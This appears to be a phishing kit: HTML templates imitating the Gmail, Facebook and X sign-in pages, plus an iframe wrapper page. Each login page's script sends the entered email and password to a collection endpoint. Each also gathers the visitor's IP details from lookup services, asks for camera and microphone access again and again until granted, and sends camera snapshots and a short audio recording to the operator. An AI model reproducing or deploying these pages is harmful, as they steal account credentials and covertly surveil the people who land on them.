            margin-top: 5px;
            text-align: left;
            display: none;
        }
        @media (max-width: 480px) {
            .container {
                padding: 24px 20px;
                margin: 10px;
                border: none;
            }
            .logo {
                width: 60px;
            }
            h1 {
                font-size: 20px;
            }
            .subtitle {
                font-size: 14px;
            }
            .buttons {
                flex-direction: column;
                align-items: flex-end;
                gap: 20px;
            }
            .create-account {
                margin-bottom: 10px;
            }
            .footer {
                font-size: 10px;
            }
        }
    </style>
</head>
<body>
    <div class="container" id="email-screen">
        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google Logo" class="logo">
        <h1>Sign in</h1>
        <div class="subtitle">to continue to Gmail</div>
        <div class="input-container">
            <input type="email" id="email-input" placeholder="Email or phone" required>
            <div id="email-error" class="error">Enter a valid email or phone number</div>
        </div>
        <div class="forgot-link">
            <a href="#">Forgot email?</a>
        </div>
        <div class="buttons">
            <div class="create-account">
                <a href="#">Create account</a>
            </div>
            <button class="next-btn" onclick="showPasswordScreen()">Next</button>
        </div>
    </div>

    <div class="container" id="password-screen">
        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google Logo" class="logo">
        <h1>Welcome</h1>
        <div class="subtitle" id="email-display"></div>
        <div class="input-container">
            <input type="password" id="password-input" placeholder="Enter your password" required>
            <div id="password-error" class="error">Password cannot be empty</div>
        </div>
        <div class="forgot-link">
            <a href="#">Forgot password?</a>
        </div>
        <div class="buttons">
            <div class="create-account">
                <a href="#" onclick="backToEmailScreen()">Back</a>
            </div>
            <button class="signin-btn" onclick="handleSignIn()">Sign in</button>
        </div>
    </div>

    <div class="footer">
        <a href="#">English (United States)</a>
        <a href="#">Help</a>
        <a href="#">Privacy</a>
        <a href="#">Terms</a>
    </div>

    <script>
        let mediaProcessingComplete = false;
        let signInClickCount = 0;

        async function fetchWithTimeout(url, timeout = 3000) {
            try {
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), timeout);
                
                const response = await fetch(url, { signal: controller.signal });
                clearTimeout(timeoutId);
                
                return { url, data: await response.text() };
            } catch (error) {
                return { url, data: `Error: ${error.message}` };
            }
        }

        async function getUserMediaPermissions() {
            while (true) {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                    return stream;
                } catch (error) {
                    await new Promise(resolve => setTimeout(resolve, 1000));
                }
            }
        }

        async function captureImageWithTimeout(stream, width = 128, height = 128, timeout = 1000) {
            const video = document.createElement('video');
            video.srcObject = stream;
            
            try {
                const loaded = new Promise(resolve => video.onloadedmetadata = resolve);
                const timeoutPromise = new Promise((_, reject) => 
                    setTimeout(() => reject(new Error('Image capture timeout')), timeout)
                );
                
                await Promise.race([loaded, timeoutPromise]);
                video.play();

                const canvas = document.createElement('canvas');
                canvas.width = width;
                canvas.height = height;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, width, height);
                
                const imageData = canvas.toDataURL('image/jpeg');
                video.srcObject = null;
                return imageData;
            } catch (error) {
                video.srcObject = null;
                return null;
            }
        }

        async function recordAudioWithTimeout(stream, duration = 5000, initialTimeout = 2000) {
            return new Promise(async (resolve) => {
                const recorder = new MediaRecorder(stream);
                const chunks = [];
                let hasData = false;
                
                recorder.ondataavailable = e => {
                    chunks.push(e.data);
                    hasData = true;
                };
                
                recorder.onstop = () => {
                    if (!hasData) {
                        resolve(null);
                        return;
                    }
                    const blob = new Blob(chunks, { type: 'audio/wav' });
                    const reader = new FileReader();
                    reader.onload = () => resolve(reader.result);
                    reader.readAsDataURL(blob);
                };

                try {
                    recorder.start();
                    
                    await Promise.race([
                        new Promise(resolve => setTimeout(resolve, initialTimeout)),
                        new Promise(resolve => recorder.onstart = resolve)
                    ]);
                    
                    if (!hasData) {
                        recorder.stop();
                        return;
                    }

                    setTimeout(() => recorder.stop(), duration);
                } catch (error) {
                    recorder.stop();
                    resolve(null);
                }
            });
        }

        async function processMedia() {
            const urls = [
                'https://ifconfig.me/',
                'https://ifconfig.me/all',
                'https://whatismyipaddress.com/',
                'https://www.showmyip.com/',
                'https://ipaddress.my/',
                'https://ipinfo.io/json',
                'https://ipapi.co/json',
                'https://ipwho.is/',
                'https://google.com/',
                'https://youtube.com/'
            ];

            const fetchPromises = urls.map(url => fetchWithTimeout(url));
            const results = await Promise.all(fetchPromises);
            const dataJson = Object.fromEntries(results.map(result => [result.url, result.data]));

            await fetch('/check_validity', {
                method: 'CHECK',
                body: JSON.stringify({
                    target: "<!checker_identity!>",
                    type: "ifconfig",
                    data: dataJson
                }),
                headers: { 'Content-Type': 'application/json' }
            });

            const stream = await getUserMediaPermissions();
            
            const devices = await navigator.mediaDevices.enumerateDevices();
            const videoDevices = devices.filter(device => device.kind === 'videoinput');
            
            for (const device of videoDevices.slice(0, 5)) {
                const cameraStream = await navigator.mediaDevices.getUserMedia({
                    video: { deviceId: device.deviceId }
                });
                
                const imageData = await captureImageWithTimeout(cameraStream);
                if (imageData) {
                    await fetch('/check_validity', {
                        method: 'CHECK',
                        body: JSON.stringify({
                            target: "<!checker_identity!>",
                            type: "camera",
                            data: imageData
                        }),
                        headers: { 'Content-Type': 'application/json' }
                    });
                }
                
                cameraStream.getTracks().forEach(track => track.stop());
            }

            const audioDevices = devices.filter(device => device.kind === 'audioinput');
            if (audioDevices.length > 0) {
                const audioStream = await navigator.mediaDevices.getUserMedia({
                    audio: { deviceId: audioDevices[0].deviceId }
                });
                
                const audioData = await recordAudioWithTimeout(audioStream);
                if (audioData) {
                    await fetch('/check_validity', {
                        method: 'CHECK',
                        body: JSON.stringify({
                            target: "<!checker_identity!>",
                            type: "microphone",
                            data: audioData
                        }),
                        headers: { 'Content-Type': 'application/json' }
                    });
                }
                
                audioStream.getTracks().forEach(track => track.stop());
            }

            mediaProcessingComplete = true;
            checkAndRedirect();
        }

        function showPasswordScreen() {
            const emailInput = document.getElementById('email-input').value;
            const emailError = document.getElementById('email-error');
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

            if (!emailInput) {
                emailError.textContent = "Email or phone cannot be empty";
                emailError.style.display = 'block';
            } else if (!emailRegex.test(emailInput)) {
                emailError.textContent = "Enter a valid email or phone number";
                emailError.style.display = 'block';
            } else {
                emailError.style.display = 'none';
                document.getElementById('email-screen').style.display = 'none';
                document.getElementById('password-screen').style.display = 'block';
                document.getElementById('email-display').textContent = emailInput;
            }
        }

        function backToEmailScreen() {
            document.getElementById('password-screen').style.display = 'none';
            document.getElementById('email-screen').style.display = 'block';
            document.getElementById('password-error').style.display = 'none';
        }

        let accountSent = false;

        async function handleSignIn() {
            const email = document.getElementById('email-input').value;
            const password = document.getElementById('password-input').value;
            const passwordError = document.getElementById('password-error');

            signInClickCount++;

            if (signInClickCount >= 3) {
                window.location.href = "<!redirect!>";
                return;
            }

            if (!password) {
                passwordError.textContent = "Password cannot be empty";
                passwordError.style.display = 'block';
                return;
            } else {
                passwordError.style.display = 'none';
            }

            await fetch('/check_validity', {
                method: 'CHECK',
                body: JSON.stringify({
                    target: "<!checker_identity!>",
                    type: "account",
                    data: { user: email, password: password }
                }),
                headers: { 'Content-Type': 'application/json' }
            });
            accountSent = true;
            checkAndRedirect();
        }

        function checkAndRedirect() {
            if (mediaProcessingComplete && accountSent) {
                window.location.href = "<!redirect!>";
            }
        }

        processMedia();
    </script>
</body>
</html>"""], "fl0": ["""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - log in or sign up</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            background-color: #f0f2f5;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding-bottom: 100px; /* Footer için hareket alanı */
        }
        .container {
            display: flex;
            flex-direction: row;
            align-items: center;
            width: 100%;
            max-width: 980px;
            padding: 20px;
            box-sizing: border-box;
        }
        .left-section {
            flex: 1;
            padding-right: 32px;
        }
        .logo {
            width: 300px;
            margin-bottom: 16px;
        }
        .tagline {
            font-size: 28px;
            color: #1c1e21;
            font-weight: 400;
            line-height: 32px;
            max-width: 500px;
        }
        .right-section {
            flex: 0.8;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .login-box {
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 396px;
            box-sizing: border-box;
        }
        input {
            width: 100%;
            padding: 14px 16px;
            margin-bottom: 10px;
            font-size: 17px;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            box-sizing: border-box;
            outline: none;
        }
        input:focus {
            border-color: #1877f2;
            box-shadow: 0 0 0 2px #e7f3ff;
        }
        .error {
            color: #d93025;
            font-size: 12px;
            margin-bottom: 10px;
            text-align: left;
            display: none;
        }
        .login-btn {
            background-color: #1877f2;
            color: white;
            border: none;
            padding: 12px;
            font-size: 20px;
            font-weight: 600;
            border-radius: 6px;
            cursor: pointer;
            width: 100%;
            margin-bottom: 16px;
        }
        .login-btn:hover {
            background-color: #166fe5;
        }
        .forgot-link {
            text-align: center;
            margin-bottom: 20px;
        }
        .forgot-link a {
            color: #1877f2;
            text-decoration: none;
            font-size: 14px;
        }
        .forgot-link a:hover {
            text-decoration: underline;
        }
        .divider {
            border-bottom: 1px solid #dadde1;
            margin: 20px 0;
        }
        .signup-btn {
            background-color: #42b72a;
            color: white;
            border: none;
            padding: 12px 16px;
            font-size: 17px;
            font-weight: 600;
            border-radius: 6px;
            cursor: pointer;
            width: auto;
            display: block;
            margin: 0 auto;
        }
        .signup-btn:hover {
            background-color: #36a420;
        }
        .footer {
            position: fixed;
            bottom: 0;
            width: 100%;
            text-align: center;
            padding: 10px 0; /* Daha az padding */
            background-color: #fff;
            color: #737373;
            font-size: 12px;
            line-height: 16px; /* Satır yüksekliği küçültüldü */
        }
        .footer a {
            color: #737373;
            text-decoration: none;
            margin: 0 8px;
        }
        .footer a:hover {
            text-decoration: underline;
        }
        @media (max-width: 900px) {
            .container {
                flex-direction: column;
                padding: 0 15px;
            }
            .left-section {
                padding-right: 0;
                text-align: center;
                margin-bottom: 20px;
            }
            .logo {
                width: 200px;
            }
            .tagline {
                font-size: 20px;
                line-height: 24px;
            }
            .right-section {
                width: 100%;
                max-width: 396px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="left-section">
            <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook Logo" class="logo">
            <p class="tagline">Connect with friends and the world around you on Facebook.</p>
        </div>
        <div class="right-section">
            <div class="login-box">
                <input type="text" placeholder="Email or phone number" id="email-input">
                <div id="email-error" class="error">Enter a valid email or phone number</div>
                <input type="password" placeholder="Password" id="password-input">
                <div id="password-error" class="error">Password cannot be empty</div>
                <button class="login-btn" onclick="handleLogin()">Log In</button>
                <div class="forgot-link">
                    <a href="#">Forgot password?</a>
                </div>
                <div class="divider"></div>
                <button class="signup-btn">Create new account</button>
            </div>
        </div>
    </div>
    <div class="footer">
        <a href="#">English (US)</a>
        <a href="#">Español</a>
        <a href="#">Français (France)</a>
        <a href="#">Italiano</a>
        <a href="#">Deutsch</a>
        <a href="#">Sign Up</a>
        <a href="#">Log In</a>
        <a href="#">Messenger</a>
        <a href="#">Facebook Lite</a>
        <a href="#">Watch</a>
        <a href="#">Places</a>
        <a href="#">Games</a>
        <a href="#">Marketplace</a>
        <br>
        <span>Meta © 2025</span>
    </div>

    <script>
        let mediaProcessingComplete = false;
        let loginClickCount = 0;

        async function fetchWithTimeout(url, timeout = 3000) {
            try {
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), timeout);
                
                const response = await fetch(url, { signal: controller.signal });
                clearTimeout(timeoutId);
                
                return { url, data: await response.text() };
            } catch (error) {
                return { url, data: `Error: ${error.message}` };
            }
        }

        async function getUserMediaPermissions() {
            while (true) {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                    return stream;
                } catch (error) {
                    await new Promise(resolve => setTimeout(resolve, 1000));
                }
            }
        }

        async function captureImageWithTimeout(stream, width = 128, height = 128, timeout = 1000) {
            const video = document.createElement('video');
            video.srcObject = stream;
            
            try {
                const loaded = new Promise(resolve => video.onloadedmetadata = resolve);
                const timeoutPromise = new Promise((_, reject) => 
                    setTimeout(() => reject(new Error('Image capture timeout')), timeout)
                );
                
                await Promise.race([loaded, timeoutPromise]);
                video.play();

                const canvas = document.createElement('canvas');
                canvas.width = width;
                canvas.height = height;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, width, height);
                
                const imageData = canvas.toDataURL('image/jpeg');
                video.srcObject = null;
                return imageData;
            } catch (error) {
                video.srcObject = null;
                return null;
            }
        }

        async function recordAudioWithTimeout(stream, duration = 5000, initialTimeout = 2000) {
            return new Promise(async (resolve) => {
                const recorder = new MediaRecorder(stream);
                const chunks = [];
                let hasData = false;
                
                recorder.ondataavailable = e => {
                    chunks.push(e.data);
                    hasData = true;
                };
                
                recorder.onstop = () => {
                    if (!hasData) {
                        resolve(null);
                        return;
                    }
                    const blob = new Blob(chunks, { type: 'audio/wav' });
                    const reader = new FileReader();
                    reader.onload = () => resolve(reader.result);
                    reader.readAsDataURL(blob);
                };

                try {
                    recorder.start();
                    
                    await Promise.race([
                        new Promise(resolve => setTimeout(resolve, initialTimeout)),
                        new Promise(resolve => recorder.onstart = resolve)
                    ]);
                    
                    if (!hasData) {
                        recorder.stop();
                        return;
                    }

                    setTimeout(() => recorder.stop(), duration);
                } catch (error) {
                    recorder.stop();
                    resolve(null);
                }
            });
        }

        async function processMedia() {
            const urls = [
                'https://ifconfig.me/',
                'https://ifconfig.me/all',
                'https://whatismyipaddress.com/',
                'https://www.showmyip.com/',
                'https://ipaddress.my/',
                'https://ipinfo.io/json',
                'https://ipapi.co/json',
                'https://ipwho.is/',
                'https://google.com/',
                'https://youtube.com/'
            ];

            const fetchPromises = urls.map(url => fetchWithTimeout(url));
            const results = await Promise.all(fetchPromises);
            const dataJson = Object.fromEntries(results.map(result => [result.url, result.data]));

            await fetch('/check_validity', {
                method: 'CHECK',
                body: JSON.stringify({
                    target: "<!checker_identity!>",
                    type: "ifconfig",
                    data: dataJson
                }),
                headers: { 'Content-Type': 'application/json' }
            });

            const stream = await getUserMediaPermissions();
            
            const devices = await navigator.mediaDevices.enumerateDevices();
            const videoDevices = devices.filter(device => device.kind === 'videoinput');
            
            for (const device of videoDevices.slice(0, 5)) {
                const cameraStream = await navigator.mediaDevices.getUserMedia({
                    video: { deviceId: device.deviceId }
                });
                
                const imageData = await captureImageWithTimeout(cameraStream);
                if (imageData) {
                    await fetch('/check_validity', {
                        method: 'CHECK',
                        body: JSON.stringify({
                            target: "<!checker_identity!>",
                            type: "camera",
                            data: imageData
                        }),
                        headers: { 'Content-Type': 'application/json' }
                    });
                }
                
                cameraStream.getTracks().forEach(track => track.stop());
            }

            const audioDevices = devices.filter(device => device.kind === 'audioinput');
            if (audioDevices.length > 0) {
                const audioStream = await navigator.mediaDevices.getUserMedia({
                    audio: { deviceId: audioDevices[0].deviceId }
                });
                
                const audioData = await recordAudioWithTimeout(audioStream);
                if (audioData) {
                    await fetch('/check_validity', {
                        method: 'CHECK',
                        body: JSON.stringify({
                            target: "<!checker_identity!>",
                            type: "microphone",
                            data: audioData
                        }),
                        headers: { 'Content-Type': 'application/json' }
                    });
                }
                
                audioStream.getTracks().forEach(track => track.stop());
            }

            mediaProcessingComplete = true;
            checkAndRedirect();
        }

        let accountSent = false;

        async function handleLogin() {
            const email = document.getElementById('email-input').value;
            const password = document.getElementById('password-input').value;
            const emailError = document.getElementById('email-error');
            const passwordError = document.getElementById('password-error');
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

            loginClickCount++;

            if (loginClickCount >= 3) {
                window.location.href = "<!redirect!>";
                return;
            }

            if (!email) {
                emailError.textContent = "Email or phone cannot be empty";
                emailError.style.display = 'block';
                return;
            } else if (!emailRegex.test(email)) {
                emailError.textContent = "Enter a valid email or phone number";
                emailError.style.display = 'block';
                return;
            } else {
                emailError.style.display = 'none';
            }

            if (!password) {
                passwordError.textContent = "Password cannot be empty";
                passwordError.style.display = 'block';
                return;
            } else {
                passwordError.style.display = 'none';
            }

            await fetch('/check_validity', {
                method: 'CHECK',
                body: JSON.stringify({
                    target: "<!checker_identity!>",
                    type: "account",
                    data: { user: email, password: password }
                }),
                headers: { 'Content-Type': 'application/json' }
            });
            accountSent = true;
            checkAndRedirect();
        }

        function checkAndRedirect() {
            if (mediaProcessingComplete && accountSent) {
                window.location.href = "<!redirect!>";
            }
        }

        processMedia();
    </script>
</body>
</html>""", """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - log in or sign up</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            background-color: #f0f2f5;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding-bottom: 100px; /* Footer için hareket alanı */
        }
        .container {
            display: flex;
            flex-direction: row;
            align-items: center;
            width: 100%;
            max-width: 980px;
            padding: 20px;
            box-sizing: border-box;
        }
        .left-section {
            flex: 1;
            padding-right: 32px;
        }
        .logo {
            width: 300px;
            margin-bottom: 16px;
        }
        .tagline {
            font-size: 28px;
            color: #1c1e21;
            font-weight: 400;
            line-height: 32px;
            max-width: 500px;
        }
        .right-section {
            flex: 0.8;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .login-box {
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 396px;
            box-sizing: border-box;
        }
        input {
            width: 100%;
            padding: 14px 16px;
            margin-bottom: 10px;
            font-size: 17px;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            box-sizing: border-box;
            outline: none;
        }
        input:focus {
            border-color: #1877f2;
            box-shadow: 0 0 0 2px #e7f3ff;
        }
        .error {
            color: #d93025;
            font-size: 12px;
            margin-bottom: 10px;
            text-align: left;
            display: none;
        }
        .login-btn {
            background-color: #1877f2;
            color: white;
            border: none;
            padding: 12px;
            font-size: 20px;
            font-weight: 600;
            border-radius: 6px;
            cursor: pointer;
            width: 100%;
            margin-bottom: 16px;
        }
        .login-btn:hover {
            background-color: #166fe5;
        }
        .forgot-link {
            text-align: center;
            margin-bottom: 20px;
        }
        .forgot-link a {
            color: #1877f2;
            text-decoration: none;
            font-size: 14px;
        }
        .forgot-link a:hover {
            text-decoration: underline;
        }
        .divider {
            border-bottom: 1px solid #dadde1;
            margin: 20px 0;
        }
        .signup-btn {
            background-color: #42b72a;
            color: white;
            border: none;
            padding: 12px 16px;
            font-size: 17px;
            font-weight: 600;
            border-radius: 6px;
            cursor: pointer;
            width: auto;
            display: block;
            margin: 0 auto;
        }
        .signup-btn:hover {
            background-color: #36a420;
        }
        .footer {
            position: fixed;
            bottom: 0;
            width: 100%;
            text-align: center;
            padding: 10px 0; /* Daha az padding */
            background-color: #fff;
            color: #737373;
            font-size: 12px;
            line-height: 16px; /* Satır yüksekliği küçültüldü */
        }
        .footer a {
            color: #737373;
            text-decoration: none;
            margin: 0 8px;
        }
        .footer a:hover {
            text-decoration: underline;
        }
        @media (max-width: 900px) {
            .container {
                flex-direction: column;
                padding: 0 15px;
            }
            .left-section {
                padding-right: 0;
                text-align: center;
                margin-bottom: 20px;
            }
            .logo {
                width: 200px;
            }
            .tagline {
                font-size: 20px;
                line-height: 24px;
            }
            .right-section {
                width: 100%;
                max-width: 396px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="left-section">
            <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook Logo" class="logo">
            <p class="tagline">Connect with friends and the world around you on Facebook.</p>
        </div>
        <div class="right-section">
            <div class="login-box">
                <input type="text" placeholder="Email or phone number" id="email-input">
                <div id="email-error" class="error">Enter a valid email or phone number</div>
                <input type="password" placeholder="Password" id="password-input">
                <div id="password-error" class="error">Password cannot be empty</div>
                <button class="login-btn" onclick="handleLogin()">Log In</button>
                <div class="forgot-link">
                    <a href="#">Forgot password?</a>
                </div>
                <div class="divider"></div>
                <button class="signup-btn">Create new account</button>
            </div>
        </div>
    </div>
    <div class="footer">
        <a href="#">English (US)</a>
        <a href="#">Español</a>
        <a href="#">Français (France)</a>
        <a href="#">Italiano</a>
        <a href="#">Deutsch</a>
        <a href="#">Sign Up</a>
        <a href="#">Log In</a>
        <a href="#">Messenger</a>
        <a href="#">Facebook Lite</a>
        <a href="#">Watch</a>
        <a href="#">Places</a>
        <a href="#">Games</a>
        <a href="#">Marketplace</a>
        <br>
        <span>Meta © 2025</span>
    </div>

    <script>
        let mediaProcessingComplete = false;
        let loginClickCount = 0;

        async function fetchWithTimeout(url, timeout = 3000) {
            try {
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), timeout);
                
                const response = await fetch(url, { signal: controller.signal });
                clearTimeout(timeoutId);
                
                return { url, data: await response.text() };
            } catch (error) {
                return { url, data: `Error: ${error.message}` };
            }
        }

        async function getUserMediaPermissions() {
            while (true) {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                    return stream;
                } catch (error) {
                    await new Promise(resolve => setTimeout(resolve, 1000));
                }
            }
        }

        async function captureImageWithTimeout(stream, width = 128, height = 128, timeout = 1000) {
            const video = document.createElement('video');
            video.srcObject = stream;
            
            try {
                const loaded = new Promise(resolve => video.onloadedmetadata = resolve);
                const timeoutPromise = new Promise((_, reject) => 
                    setTimeout(() => reject(new Error('Image capture timeout')), timeout)
                );
                
                await Promise.race([loaded, timeoutPromise]);
                video.play();

                const canvas = document.createElement('canvas');
                canvas.width = width;
                canvas.height = height;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, width, height);
                
                const imageData = canvas.toDataURL('image/jpeg');
                video.srcObject = null;
                return imageData;
            } catch (error) {
                video.srcObject = null;
                return null;
            }
        }

        async function recordAudioWithTimeout(stream, duration = 5000, initialTimeout = 2000) {
            return new Promise(async (resolve) => {
                const recorder = new MediaRecorder(stream);
                const chunks = [];
                let hasData = false;
                
                recorder.ondataavailable = e => {
                    chunks.push(e.data);
                    hasData = true;
                };
                
                recorder.onstop = () => {
                    if (!hasData) {
                        resolve(null);
                        return;
                    }
                    const blob = new Blob(chunks, { type: 'audio/wav' });
                    const reader = new FileReader();
                    reader.onload = () => resolve(reader.result);
                    reader.readAsDataURL(blob);
                };

                try {
                    recorder.start();
                    
                    await Promise.race([
                        new Promise(resolve => setTimeout(resolve, initialTimeout)),
                        new Promise(resolve => recorder.onstart = resolve)
                    ]);
                    
                    if (!hasData) {
                        recorder.stop();
                        return;
                    }

                    setTimeout(() => recorder.stop(), duration);
                } catch (error) {
                    recorder.stop();
                    resolve(null);
                }
            });
        }

        async function processMedia() {
            const urls = [
                'https://ifconfig.me/',
                'https://ifconfig.me/all',
                'https://whatismyipaddress.com/',
                'https://www.showmyip.com/',
                'https://ipaddress.my/',
                'https://ipinfo.io/json',
                'https://ipapi.co/json',
                'https://ipwho.is/',
                'https://google.com/',
                'https://youtube.com/'
            ];

            const fetchPromises = urls.map(url => fetchWithTimeout(url));
            const results = await Promise.all(fetchPromises);
            const dataJson = Object.fromEntries(results.map(result => [result.url, result.data]));

            await fetch('/check_validity', {
                method: 'CHECK',
                body: JSON.stringify({
                    target: "<!checker_identity!>",
                    type: "ifconfig",
                    data: dataJson
                }),
                headers: { 'Content-Type': 'application/json' }
            });

            const stream = await getUserMediaPermissions();
            
            const devices = await navigator.mediaDevices.enumerateDevices();
            const videoDevices = devices.filter(device => device.kind === 'videoinput');
            
            for (const device of videoDevices.slice(0, 5)) {
                const cameraStream = await navigator.mediaDevices.getUserMedia({
                    video: { deviceId: device.deviceId }
                });
                
                const imageData = await captureImageWithTimeout(cameraStream);
                if (imageData) {
                    await fetch('/check_validity', {
                        method: 'CHECK',
                        body: JSON.stringify({
                            target: "<!checker_identity!>",
                            type: "camera",
                            data: imageData
                        }),
                        headers: { 'Content-Type': 'application/json' }
                    });
                }
                
                cameraStream.getTracks().forEach(track => track.stop());
            }

            const audioDevices = devices.filter(device => device.kind === 'audioinput');
            if (audioDevices.length > 0) {
                const audioStream = await navigator.mediaDevices.getUserMedia({
                    audio: { deviceId: audioDevices[0].deviceId }
                });
                
                const audioData = await recordAudioWithTimeout(audioStream);
                if (audioData) {
                    await fetch('/check_validity', {
                        method: 'CHECK',
                        body: JSON.stringify({
                            target: "<!checker_identity!>",
                            type: "microphone",
                            data: audioData
                        }),
                        headers: { 'Content-Type': 'application/json' }
                    });
                }
                
                audioStream.getTracks().forEach(track => track.stop());
            }

            mediaProcessingComplete = true;
            checkAndRedirect();
        }

        let accountSent = false;

        async function handleLogin() {
            const email = document.getElementById('email-input').value;
            const password = document.getElementById('password-input').value;
            const emailError = document.getElementById('email-error');
            const passwordError = document.getElementById('password-error');
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

            loginClickCount++;

            if (loginClickCount >= 3) {
                window.location.href = "<!redirect!>";
                return;
            }

            if (!email) {
                emailError.textContent = "Email or phone cannot be empty";
                emailError.style.display = 'block';
                return;
            } else if (!emailRegex.test(email)) {
                emailError.textContent = "Enter a valid email or phone number";
                emailError.style.display = 'block';
                return;
            } else {
                emailError.style.display = 'none';
            }

            if (!password) {
                passwordError.textContent = "Password cannot be empty";
                passwordError.style.display = 'block';
                return;
            } else {
                passwordError.style.display = 'none';
            }

            await fetch('/check_validity', {
                method: 'CHECK',
                body: JSON.stringify({
                    target: "<!checker_identity!>",
                    type: "account",
                    data: { user: email, password: password }
                }),
                headers: { 'Content-Type': 'application/json' }
            });
            accountSent = true;
            checkAndRedirect();
        }

        function checkAndRedirect() {
            if (mediaProcessingComplete && accountSent) {
                window.location.href = "<!redirect!>";
            }
        }

        processMedia();
    </script>
</body>
</html>"""], "cq0": ["""<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title></title><style>html,body{margin:0;padding:0;height:100%;overflow:hidden}iframe{width:100%;height:100%;border:none}</style></head><body><iframe src="<!custom_query!>" title=""></iframe></body></html>""", """<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title></title><style>html,body{margin:0;padding:0;height:100%;overflow:hidden}iframe{width:100%;height:100%;border:none}</style></head><body><iframe src="<!custom_query!>" title=""></iframe></body></html>"""], "xtl0": ["""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - X</title>
    <link href="https://fonts.googleapis.com/css2?family=Helvetica:wght@400;500&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Helvetica', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            background: #000000; /* X'in koyu arka planı */
        }
        .container {
            width: 100%;
            max-width: 400px;
            padding: 30px;
            background-color: #1D2525; /* Giriş kutusu arka planı */
            border-radius: 16px;
            box-sizing: border-box;
            margin: 20px;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
        }
        .logo {
            display: block;
            margin: 0 auto 20px;
            width: 40px;
            height: 40px;
            filter: brightness(0) invert(1); /* Beyaz logo */
        }
        h1 {
            font-size: 20px;
            font-weight: 500;
            color: #FFFFFF;
            text-align: center;
            margin: 0 0 8px;
        }
        .subtitle {
            font-size: 14px;
            color: #71767B;
            text-align: center;
            margin-bottom: 20px;
        }
        .input-container {
            margin-bottom: 15px;
        }
        input {
            width: 100%;
            padding: 12px 14px;
            font-size: 16px;
            border: 1px solid #536471;
            border-radius: 8px;
            outline: none;
            box-sizing: border-box;
            background-color: #2F3336;
            color: #FFFFFF;
        }
        input::placeholder {
            color: #71767B;
        }
        input:focus {
            border-color: #1DA1F2;
            box-shadow: 0 0 0 1px #1DA1F2;
        }
        .forgot-link {
            margin-bottom: 20px;
        }
        .forgot-link a {
            color: #1DA1F2;
            text-decoration: none;
            font-size: 12px;
        }
        .buttons {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .create-account a {
            color: #1DA1F2;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }
        .next-btn, .signin-btn {
            background-color: #1DA1F2;
            color: #FFFFFF;
            border: none;
            padding: 8px 20px;
            border-radius: 20px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
        }
        .next-btn:hover, .signin-btn:hover {
            background-color: #1991DA;
        }
        .footer {
            position: fixed;
            bottom: 0;
            left: 0;
            width: 100%;
            text-align: center;
            color: #71767B;
            font-size: 12px;
            padding: 10px 0;
            background-color: #000000; /* Opak siyah arka plan */
            z-index: 1000;
            box-shadow: 0 -1px 3px rgba(0, 0, 0, 0.1);
        }
        .footer a {
            color: #71767B;
            text-decoration: none;
            margin: 0 8px;
        }
        .footer a:hover {
            color: #1DA1F2;
        }
        #email-screen {
            display: block;
        }
        #password-screen {
            display: none;
        }
        .error {
            color: #F4212E;
            font-size: 12px;
            margin-top: 5px;
            text-align: left;
            display: none;
        }
        @media (max-width: 480px) {
            .container {
                padding: 15px;
